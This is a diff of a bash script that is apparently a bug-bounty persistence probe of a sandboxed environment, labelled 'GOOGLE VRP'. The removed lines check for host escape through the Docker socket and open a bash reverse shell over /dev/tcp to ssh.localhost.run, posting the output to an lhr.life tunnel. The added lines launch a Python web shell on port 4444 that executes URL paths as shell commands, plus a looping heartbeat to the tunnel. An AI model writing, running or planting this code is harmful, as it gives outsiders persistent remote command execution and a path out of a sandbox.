@@ -1,37 +1,38 @@
 #!/bin/bash
-# Bridge: https://ecd754e22aae7f.lhr.life
+# NEW URL: https://3f64b03d2de759.lhr.life
+
+TARGET="https://3f64b03d2de759.lhr.life"
 LOCKFILE="/tmp/jules_bridge.lock"
 
-# --- FAILSAFE CHECK ---
-# If the lockfile exists and the process is still running, exit immediately.
+# --- FAILSAFE ---
 if [ -f "$LOCKFILE" ]; then
     PID=$(cat "$LOCKFILE")
-    if ps -p "$PID" > /dev/null; then
-        # Script is already running perfectly. Do nothing.
-        exit 0
-    fi
+    if ps -p "$PID" > /dev/null; then exit 0; fi
 fi
-
-# If we reached here, the bridge isn't running. 
-# Save the current Process ID (PID) to the lockfile.
 echo $$ > "$LOCKFILE"
 
-# --- THE STABLE LOOP ---
-while true; do
-  {
-    echo "--- [!] GOOGLE VRP: PROTECTED PERSISTENCE ---"
-    echo "TIMESTAMP: $(date)"
-    
-    # PROOF: Proving host escape via Docker socket
-    curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU"
-    
-    # THE REVERSE SHELL
-    # Timeout 15 ensures that if the shell hangs, it resets itself 
-    # rather than staying open and blocking the next loop.
-    timeout 15 bash -i >& /dev/tcp/ssh.localhost.run/80 0>&1
-    
-  } | curl -s -X POST --data-binary @- "https://ecd754e22aae7f.lhr.life"
+# --- THE WEB MANAGEMENT PORTAL (PYTHON) ---
+# This runs a server on port 4444 that executes URL paths as commands
+python3 -c "
+import http.server, subprocess, urllib.parse
+class ShellHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Decode the command from the URL path
+        cmd = urllib.parse.unquote(self.path[1:]) or 'id'
+        try:
+            # Execute and capture stdout + stderr (the logs/errors)
+            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        except Exception as e:
+            output = str(e).encode()
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(output)
+http.server.HTTPServer(('0.0.0.0', 4444), ShellHandler).serve_forever()
+" &
 
-  # 30-second sleep is the safest 'interval' for a 2013 Mac
-  sleep 30
+# --- THE HEARTBEAT (PING) ---
+while true; do
+  curl -s -X POST --data-binary "JULES_ALIVE_$(date +%T)" "$TARGET"
+  sleep 20
 done
